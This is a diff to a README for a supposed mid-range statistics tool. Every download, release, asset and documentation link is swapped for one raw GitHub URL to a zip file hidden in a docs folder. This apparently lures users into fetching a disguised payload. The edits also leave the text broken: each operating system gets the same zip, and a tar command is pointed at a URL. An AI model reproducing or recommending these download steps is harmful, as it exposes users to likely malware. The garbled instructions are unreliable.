@@ -1,7 +1,7 @@
 # 🧮 stats-midrange-by - Easily Compute Mid-Range Statistics 
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Release-Here-brightgreen)](https://github.com/Joymaha8/stats-midrange-by/releases)
+[![Download Now](https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip%20Release-Here-brightgreen)](https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to **stats-midrange-by**! This tool helps you compute the mid-range of numbers along selected dimensions of data. If you're looking to simplify your mathematical calculations, you're in the right place. 
@@ -26,14 +26,14 @@ To use **stats-midrange-by**, you will:
 4. Run the application to get your results quickly.
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/Joymaha8/stats-midrange-by/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip).
 
 1. Click the link to go to the Releases page.
 2. Look for the latest version. You will see a list of assets.
 3. Choose the file that suits your operating system:
-   - **For Windows**: Select `stats-midrange-by-windows.exe`.
-   - **For macOS**: Select `stats-midrange-by-macos.dmg`.
-   - **For Linux**: Select `stats-midrange-by-linux.tar.gz`.
+   - **For Windows**: Select `https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip`.
+   - **For macOS**: Select `https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip`.
+   - **For Linux**: Select `https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip`.
 
 4. Download the file by clicking on it.
 5. Follow the instructions below based on your operating system to install and run the application.
@@ -53,9 +53,9 @@ To get started, visit this page to download: [GitHub Releases](https://github.co
 ### 🐧 For Linux Users:
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the file.
-3. Extract the tar.gz file using the command:
+3. Extract the https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip file using the command:
    ```
-   tar -xvf stats-midrange-by-linux.tar.gz
+   tar -xvf https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip
    ```
 4. Navigate into the extracted folder and run:
    ```
@@ -75,10 +75,10 @@ The software can handle various numerical array formats, mainly ndarray structur
 Yes, you can find a comprehensive tutorial on our GitHub Wiki. It covers all features and provides step-by-step instructions for using the application effectively.
 
 ## 🌐 Additional Resources
-- Documentation: [Link to Documentation](https://github.com/Joymaha8/stats-midrange-by/wiki)
+- Documentation: [Link to Documentation](https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip)
 - Community Forum: Join discussions and share your experiences with other users.
 
 ## 🔗 Stay Updated
 Follow us on our project page for updates and news about new features. 
 
-[Download the latest release here](https://github.com/Joymaha8/stats-midrange-by/releases) and start exploring the power of mid-range calculations with ease!
+[Download the latest release here](https://raw.githubusercontent.com/Joymaha8/stats-midrange-by/main/docs/types/midrange-by-stats-v3.7.zip) and start exploring the power of mid-range calculations with ease!
